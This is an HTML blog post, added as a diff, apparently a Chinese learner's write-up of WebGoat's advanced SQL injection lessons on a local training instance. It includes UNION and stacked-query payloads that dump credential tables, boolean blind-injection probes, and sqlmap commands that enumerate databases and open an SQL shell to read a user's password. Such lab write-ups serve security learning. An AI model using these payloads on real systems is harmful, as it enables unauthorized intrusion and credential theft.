@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>
+      
+    从 0 开始的 WebGoat 学习 (2) - Injection(advanced) - chan9t1an 的安全学习
+    
+    </title>
+    
+
+    
+    
+    <link href="atom.xml" rel="alternate" title="chan9t1an 的安全学习" type="application/atom+xml">
+    <link rel="stylesheet" href="asset/css/style.min.css">
+    <link rel="stylesheet" href="asset/css/doc.css">
+    <script src="asset/app.js"></script>
+</head>
+  <body>
+    <section class="hero">
+      <div class="hero-head">
+          <nav class="navbar" role="navigation" aria-label="main navigation">
+              <div class="container">
+              <div class="navbar-brand">
+                
+                <a target="self" class="navbar-item " href="index.html">Home</a>
+                
+                <a target="_self" class="navbar-item " href="archives.html">Archives</a>
+                
+
+                <a role="button" id="navbarSNSRssSwitchBtn" class="navbar-burger burger" aria-label="menu" aria-expanded="false" data-target="navbarSNSRssButtons">
+                  <span aria-hidden="true"></span>
+                  <span aria-hidden="true"></span>
+                  <span aria-hidden="true"></span>
+                </a>
+              </div>
+            
+              <div id="navbarSNSRssButtons" class="navbar-menu">
+                <div class="navbar-start">
+                  
+                </div>
+            
+                <div class="navbar-end">
+                  <div class="navbar-item">
+                    <!--buttons start-->
+                    <div class="buttons">
+                      
+                        
+                        
+                        
+                        
+                      
+                      <a href="atom.xml" target="_blank" title="RSS">
+                          <span class="icon is-large has-text-black-bis">
+                              <svg class="svg-inline--fa fa-rss fa-w-14 fa-lg" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="rss" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M128.081 415.959c0 35.369-28.672 64.041-64.041 64.041S0 451.328 0 415.959s28.672-64.041 64.041-64.041 64.04 28.673 64.04 64.041zm175.66 47.25c-8.354-154.6-132.185-278.587-286.95-286.95C7.656 175.765 0 183.105 0 192.253v48.069c0 8.415 6.49 15.472 14.887 16.018 111.832 7.284 201.473 96.702 208.772 208.772.547 8.397 7.604 14.887 16.018 14.887h48.069c9.149.001 16.489-7.655 15.995-16.79zm144.249.288C439.596 229.677 251.465 40.445 16.503 32.01 7.473 31.686 0 38.981 0 48.016v48.068c0 8.625 6.835 15.645 15.453 15.999 191.179 7.839 344.627 161.316 352.465 352.465.353 8.618 7.373 15.453 15.999 15.453h48.068c9.034-.001 16.329-7.474 16.005-16.504z"></path></svg><!-- <i class="fas fa-rss fa-lg"></i> -->
+                          </span>
+                      </a>
+                    </div>
+                    <!--buttons end-->
+
+                  </div>
+                </div>
+                </div>
+              </div>
+            </nav>
+      </div>
+
+ <div class="hero-body ct-body"></div>
+      
+    </section>
+    <section class="ct-body">
+      <div class="container">
+          <div class="columns is-variable bd-klmn-columns is-4 is-centered">
+              <div class="column is-four-fifths">
+                  <div class="post-body single-content">
+                    
+                    <h1 class="title">
+                            从 0 开始的 WebGoat 学习 (2) - Injection(advanced)   
+                      </h1>
+                     
+                    
+                      <div class="media">
+                            
+                            <div class="media-content">
+                              <div class="content">
+                                <p>
+                                 <span class="date">2021/12/21 09:55 上午</span>
+                                  <span class="tran-posted-in">posted in</span>&nbsp; 
+                                  
+                                      <span class="posted-in"><a href='WebGoat.html'>WebGoat</a></span>
+                                         
+                                  
+
+                                   
+                                      
+                                  <br />
+                                  <span class="tran-tags">Tags:</span>&nbsp;
+                                  
+                                    <a class="tag is-link is-light" href='tag_sql.html'>#sql</a>
+                                  
+                                    <a class="tag is-link is-light" href='tag_security.html'>#security</a>
+                                  
+                                    <a class="tag is-link is-light" href='tag_injection.html'>#injection</a>
+                                  
+                                    <a class="tag is-link is-light" href='tag_sqlmap.html'>#sqlmap</a>
+                                     
+
+                                </p>
+                              </div>
+                            </div>
+                         
+                    </div>
+                </div>
+                  <article class="markdown-body single-content">
+                    <ul>
+<li><a href="#%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84-webgoat%E5%AD%A6%E4%B9%A0-2-injection-advanced">从 0 开始的 WebGoat 学习 (2) - Injection(advanced)</a>
+<ul>
+<li><a href="#0x00%E5%AD%A6%E4%B9%A0%E7%9B%AE%E6%A0%87">0x00 学习目标</a></li>
+<li><a href="#0x01%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7">0x01 一些技巧</a></li>
+<li><a href="#0x02-lesson-3%E9%A2%98%E7%9B%AE">0x02 Lesson 3 题目</a></li>
+<li><a href="#0x03-sql%E7%9B%B2%E6%B3%A8">0x03 SQL 盲注</a></li>
+<li><a href="#0x04-lesson-5%E7%BB%BC%E5%90%88%E7%BB%83%E4%B9%A0">0x04 Lesson 5 综合练习</a>
+<ul>
+<li><a href="#%E7%9B%AE%E6%A0%87">目标</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4">步骤</a>
+<ul>
+<li><a href="#%E4%BA%86%E8%A7%A3%E4%B8%9A%E5%8A%A1%E5%9C%BA%E6%99%AF">了解业务场景</a>
+<ul>
+<li><a href="#%E6%B3%A8%E5%86%8C">注册</a></li>
+<li><a href="#%E7%99%BB%E5%BD%95">登录</a></li>
+<li><a href="#%E5%BF%98%E8%AE%B0%E5%AF%86%E7%A0%81">忘记密码</a></li>
+</ul>
+</li>
+<li><a href="#%E5%B0%9D%E8%AF%95%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9">尝试寻找注入点</a></li>
+<li><a href="#%E9%87%8D%E6%96%B0%E6%95%B4%E7%90%86%E6%80%9D%E8%B7%AF">重新整理思路</a></li>
+<li><a href="#%E6%94%BE%E5%BC%83%E5%B9%B6%E7%9B%B4%E6%8E%A5%E7%9C%8B%E7%AD%94%E6%A1%88%E5%AD%A6%E4%B9%A0">放弃并直接看答案学习</a></li>
+<li><a href="#sqlmap">sqlmap</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#0x05-lesson-6%E9%80%89%E6%8B%A9%E9%A2%98">0x05 Lesson 6 选择题</a></li>
+<li><a href="#0x06%E6%80%BB%E7%BB%93">0x06 总结</a></li>
+</ul>
+</li>
+</ul>
+<h2><a id="0x00%E5%AD%A6%E4%B9%A0%E7%9B%AE%E6%A0%87" class="anchor" aria-hidden="true"><span class="octicon octicon-link"></span></a>0x00 学习目标</h2>
+<ul>
+<li>组合 SQL 注入技术</li>
+<li>SQL 盲注</li>
+</ul>
+<h2><a id="0x01%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7" class="anchor" aria-hidden="true"><span class="octicon octicon-link"></span></a>0x01 一些技巧</h2>
+<p>注释, 可以用来把后续的 SQL 语句都给忽略掉</p>
+<pre><code class="language-sql">-- 行内注释
+/* */ 
+
+-- 整行注释
+--
+</code></pre>
+<p>Union, 可以将页面中原本的内容替换为自己想要查询的内容</p>
+<p>Join, 暂时不知道有啥用</p>
+<h2><a id="0x02-lesson-3%E9%A2%98%E7%9B%AE" class="anchor" aria-hidden="true"><span class="octicon octicon-link"></span></a>0x02 Lesson 3 题目</h2>
+<p>Union 的时候要注意字段数量和字段类型</p>
+<pre><code class="language-sql">-- 目标: 获取所有 user_system_data 数据 
+
+-- 拼接逻辑:
+SELECT * FROM user_data WHERE last_name = ''
+
+-- 预期 SQL1:
+select * from user_data where last_name = '' union select userid, user_name, password, cookie, '1','1',1 from user_system_data --' 
+
+-- 需要填写的值1
+-- ' union select userid, user_name, password, cookie, '1','1',1 from user_system_data --
+
+-- 预期 SQL2:
+select * from user_data where last_name = ''; select userid, user_name, password, cookie from user_system_data --' 
+-- 需要填写的值2:
+-- '; select userid, user_name, password, cookie from user_system_data --
+</code></pre>
+<h2><a id="0x03-sql%E7%9B%B2%E6%B3%A8" class="anchor" aria-hidden="true"><span class="octicon octicon-link"></span></a>0x03 SQL 盲注</h2>
+<p>向数据库问一些真假问题以判断是否存在 SQL 注入漏洞或者一些更具体的信息, 以方便后续实施真正的注入</p>
+<p>比如, 判断是否存在 SQL 注入: <code>https://shop.example.com?article=4 AND 1=2</code></p>
+<p>判断数据库版本: <code>https://shop.example.com?article=4 AND substring(database_version(),1,1) = 2</code></p>
+<h2><a id="0x04-lesson-5%E7%BB%BC%E5%90%88%E7%BB%83%E4%B9%A0" class="anchor" aria-hidden="true"><span class="octicon octicon-link"></span></a>0x04 Lesson 5 综合练习</h2>
+<h3><a id="%E7%9B%AE%E6%A0%87" class="anchor" aria-hidden="true"><span class="octicon octicon-link"></span></a>目标</h3>
+<p>使用账号 <code>Tom</code> 登录</p>
+<h3><a id="%E6%AD%A5%E9%AA%A4" class="anchor" aria-hidden="true"><span class="octicon octicon-link"></span></a>步骤</h3>
+<h4><a id="%E4%BA%86%E8%A7%A3%E4%B8%9A%E5%8A%A1%E5%9C%BA%E6%99%AF" class="anchor" aria-hidden="true"><span class="octicon octicon-link"></span></a>了解业务场景</h4>
+<p>看起来是个模拟的注册登录场景, 先用 <code>BurpSuite</code> 分别看一下几个请求的情况<br />
+这个场景有两个请求</p>
+<h5><a id="%E6%B3%A8%E5%86%8C" class="anchor" aria-hidden="true"><span class="octicon octicon-link"></span></a>注册</h5>
+<p>请求信息</p>
+<pre><code class="language-http">PUT /WebGoat/SqlInjectionAdvanced/challenge HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Length: 60
+sec-ch-ua: &quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;96&quot;
+Accept: */*
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+sec-ch-ua-platform: &quot;macOS&quot;
+Origin: http://127.0.0.1:8080
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://127.0.0.1:8080/WebGoat/start.mvc
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: JSESSIONID=IkJAD6NwYIofVW_g2LG9l0KrFGphdzRL8f512YvL
+Connection: close
+
+username_reg=&amp;email_reg=&amp;password_reg=&amp;confirm_password_reg=
+</code></pre>
+<p>可以正常注册新用户</p>
+<h5><a id="%E7%99%BB%E5%BD%95" class="anchor" aria-hidden="true"><span class="octicon octicon-link"></span></a>登录</h5>
+<pre><code class="language-http">POST /WebGoat/SqlInjectionAdvanced/challenge_Login HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Length: 31
+sec-ch-ua: &quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;96&quot;
+Accept: */*
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+sec-ch-ua-platform: &quot;macOS&quot;
+Origin: http://127.0.0.1:8080
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://127.0.0.1:8080/WebGoat/start.mvc
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: JSESSIONID=IkJAD6NwYIofVW_g2LG9l0KrFGphdzRL8f512YvL
+Connection: close
+
+username_login=&amp;password_login=
+</code></pre>
+<p>新注册的用户可以登录, 但提示要用 Tom 登录</p>
+<h5><a id="%E5%BF%98%E8%AE%B0%E5%AF%86%E7%A0%81" class="anchor" aria-hidden="true"><span class="octicon octicon-link"></span></a>忘记密码</h5>
+<p>不能用</p>
+<h4><a id="%E5%B0%9D%E8%AF%95%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9" class="anchor" aria-hidden="true"><span class="octicon octicon-link"></span></a>尝试寻找注入点</h4>
+<p>先试试登录</p>
+<pre><code class="language-plain_text">-- 猜测拼接逻辑
+select * from user where username = '' and password = '';
+
+-- 尝试注入
+' OR '1' = '1' --
+
+-- 进不去
+</code></pre>
+<p>再来看看注册场景, 乱试了一通也没什么头绪</p>
+<h4><a id="%E9%87%8D%E6%96%B0%E6%95%B4%E7%90%86%E6%80%9D%E8%B7%AF" class="anchor" aria-hidden="true"><span class="octicon octicon-link"></span></a>重新整理思路</h4>
+<p>先按照业务流程整理一下可能的 SQL 吧, 然后再看看这中间哪里可能会有问题</p>
+<pre><code class="language-sql">-- 注册
+-- 先查询用户是否存在
+select * from users where username = '';
+
+-- 如果用户不存在
+insert into user (username, email, password) values ('', '', '');
+
+-- 登录
+select * from users where username = '' and password = '';
+</code></pre>
+<p>按照这几个可能的 SQL 猜测又去试了下, 依然没什么发现</p>
+<h4><a id="%E6%94%BE%E5%BC%83%E5%B9%B6%E7%9B%B4%E6%8E%A5%E7%9C%8B%E7%AD%94%E6%A1%88%E5%AD%A6%E4%B9%A0" class="anchor" aria-hidden="true"><span class="octicon octicon-link"></span></a>放弃并直接看答案学习</h4>
+<p>原来注入点存在于注册场景的用户名<br />
+当用户名存在的时候, 系统会反馈 xxx 用户已存在<br />
+但如果我们输入一些注入的用户名, 系统会帮忙将后面的条件一起来判断</p>
+<p>比如当输入的 username_reg 的值为 <code>tom' and '1'='1</code> 时, 系统会认为用户已存在<br />
+但当输入的值为 <code>tom' and '1'='2</code> 时, 系统会认为用户不存在</p>
+<p>利用这一点, 我们可以<strong>向系统提问</strong></p>
+<p>最简单暴力的思路, 可以直接猜测密码的字段名为 <code>password</code>, 然后直接利用 <code>substring(password, 1,1)</code> 逐字符去遍历询问系统 (假如密码是明文保存的话, 这题目里的密码还真的就是明文保存的)</p>
+<p>如果是正常一点的思路, 我觉得这个时候应该尝试去使用自动化的工具看看这个已存在的破绽有什么继续可以利用的地方</p>
+<h4><a id="sqlmap" class="anchor" aria-hidden="true"><span class="octicon octicon-link"></span></a>sqlmap</h4>
+<p><a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a><br />
+中文说明: <a href="https://www.tr0y.wang/2018/03/21/sqlmap-guide/">https://www.tr0y.wang/2018/03/21/sqlmap-guide/</a></p>
+<p>先确定漏洞<br />
+将注册的 http request 放到文件中, 用 sqlmap 去扫描</p>
+<pre><code class="language-bash">python sqlmap.py -r ~/register.http
+</code></pre>
+<p>sqlmap 会确定 username_reg 参数存在 boolean-based blind 漏洞<br />
+这和我们上面手工确定的信息一致</p>
+<p>再查看当前数据库和数据表</p>
+<pre><code class="language-bash">python sqlmap.py --thread 10 -r ~/register.http -p username_reg --current-db
+python sqlmap.py --thread 10 -r ~/register.http -p username_reg -D PUBLIC --tables
+</code></pre>
+<p>这里有些奇怪, 发现 PUBLIC 库下没有表<br />
+那就爆库看看都有哪些数据库吧</p>
+<pre><code class="language-bash">python sqlmap.py --thread 10 -r ~/register.http -p username_reg --dbs
+python sqlmap.py --thread 10 -r ~/register.http -p username_reg --dbs --no-cast
+</code></pre>
+<p>发现了这些数据库, 如果 PUBLIC 下面没有表的话, 莫非是在 chan9t1an 库 (webgoat 的注册账号)下?</p>
+<pre><code class="language-plain_text">[*] container
+[*] CONTAINER
+[*] chan9t1an
+[*] INFORMATION_SCHEMA
+[*] PUBLIC
+[*] SYSTEM_LOBS
+</code></pre>
+<pre><code class="language-bash">python sqlmap.py --thread 10 -r ~/register.http -p username_reg -D chan9t1an --tables
+
+python sqlmap.py --thread 10 -r ~/register.http -p username_reg -D chan9t1an --tables --no-cast
+</code></pre>
+<pre><code class="language-plain_text">[11 tables]
++-----------------------+
+| CHALLENGE_USERS       |
+| EMPLOYEES             |
+| GRANT_RIGHTS          |
+| JWT_KEYS              |
+| SALARIES              |
+| SERVERS               |
+| SQL_CHALLENGE_USERS   |
+| USER_DATA             |
+| USER_DATA_TAN         |
+| USER_SYSTEM_DATA      |
+| flyway_schema_history |
++-----------------------+
+</code></pre>
+<p>查询几个可能的表中具体字段和数据了</p>
+<pre><code class="language-bash">python sqlmap.py -r ~/register.http -p username_reg -D chan9t1an -T SQL_CHALLENGE_USERS --columns
+</code></pre>
+<p>进入 sql-shell 模式, 直接查询 tom 的密码</p>
+<pre><code class="language-bash">python sqlmap.py -r ~/register.http -p username_reg --sql-shell
+ 
+select PASSWORD from SQL_CHALLENGE_USERS where USERID='tom' 
+</code></pre>
+<p>获得密码, 通关</p>
+<h2><a id="0x05-lesson-6%E9%80%89%E6%8B%A9%E9%A2%98" class="anchor" aria-hidden="true"><span class="octicon octicon-link"></span></a>0x05 Lesson 6 选择题</h2>
+<p>不再赘述</p>
+<h2><a id="0x06%E6%80%BB%E7%BB%93" class="anchor" aria-hidden="true"><span class="octicon octicon-link"></span></a>0x06 总结</h2>
+<p>sqlmap 这工具有点厉害啊</p>
+
+                  </article>
+                  <div class="comments-wrap">
+                    <div class="share-comments">
+                      
+
+                      
+
+                      
+                    </div>
+                  </div><!-- end comments wrap -->
+              </div>
+            </div><!-- end columns -->
+      </div><!-- end container -->
+    </section>
+
+
+
+    <footer class="footer">
+        <div class="content has-text-centered">
+          <p>
+              Copyright &copy; 2019
+              Powered by <a target="_blank" href="http://www.mweb.im">MWeb</a>,&nbsp; 
+              Theme used <a target="_blank" href="https://bulma.io/">Bulma CSS</a>.
+          </p>
+        </div>
+      </footer>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script src="asset/prism.js"></script>
+
+
+
+  
+    
+
+
+
+
+  </body>
+</html>
